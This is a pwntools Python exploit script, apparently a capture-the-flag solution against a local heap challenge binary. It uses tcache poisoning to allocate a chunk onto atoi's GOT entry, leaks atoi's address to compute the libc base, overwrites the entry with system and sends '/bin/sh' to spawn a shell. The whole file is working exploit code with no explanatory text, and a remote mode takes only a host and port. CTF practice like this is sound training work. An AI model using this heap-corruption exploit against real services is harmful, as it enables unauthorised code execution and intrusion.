from pwn import *
import sys
context(arch='amd64', os='linux')

file_name = './heap_patched' 
libc_name = './libc.so.6'

elf = ELF(file_name)
libc = ELF(libc_name)

gdb_   = 1 if ('gdb' in sys.argv)       else 0
switch = 1 if ('remote' in sys.argv)    else 0
debug  = 0 if ('deoff'  in sys.argv)    else 1

if switch:
    target = ''
    port   = 0
    p = remote(target, port)
else:
    p = process(file_name)

if debug:
    context(log_level='debug')

gdb_ = 0
if gdb_ and switch == 0:
    gdb.attach(p)
    pause()

s    = lambda data               : p.send(data)
sa   = lambda delim, data        : p.sendafter(delim, data)
sl   = lambda data               : p.sendline(data)
sla  = lambda delim, data        : p.sendlineafter(delim, data)
r    = lambda numb=4096          : p.recv(numb)
ru   = lambda delim, drop=True   : p.recvuntil(delim, drop)
rl   = lambda                    : p.recvline()
lg   = lambda name, data         : log.success(name + ': ' + hex(data))
uu64 = lambda data               : u64(data.ljust(8, b'\x00'))
search = lambda s : next(libc.search(s if isinstance(s, bytes) else s.encode()))

def init_libc(leak, offset, name='Libc'):
    if isinstance(offset, str):
        offset = libc.sym[offset]
    libc.address = leak - offset
    log.success(f"{name} Base: {hex(libc.address)}")
#################################################################################

def command(option): 
    sla(b'choice',str(option).encode())

def add(idx,Size): 
    command(1) 
    sla(b'index',str(idx).encode())
    sla(b'size',str(Size).encode())

def free(idx): 
    command(2) 
    sla(b'index',str(idx).encode())

def edit(idx,Size,Content): 
    command(3) 
    sla(b'index',str(idx).encode())
    sla(b'length',str(Size).encode()) 
    sa(b'content',Content)

def show(idx): 
    command(4) 
    sla(b'index',str(idx).encode())

atoi_got=0x601050 
add(1,0x100) 
add(2,0x100) 
free(1) 
free(2) 
edit(2,0x100,p64(atoi_got)) 
add(3,0x100) 
add(4,0x100) 
show(4) 
rl()
leak='atoi' 
leak_add = uu64(ru(b'\n'))
init_libc(leak_add,leak)
system=libc.sym['system'] 
str_bin_sh = search('/bin/sh')
edit(4,0x100,p64(system)) 
sl(b'/bin/sh\x00') 
p.interactive()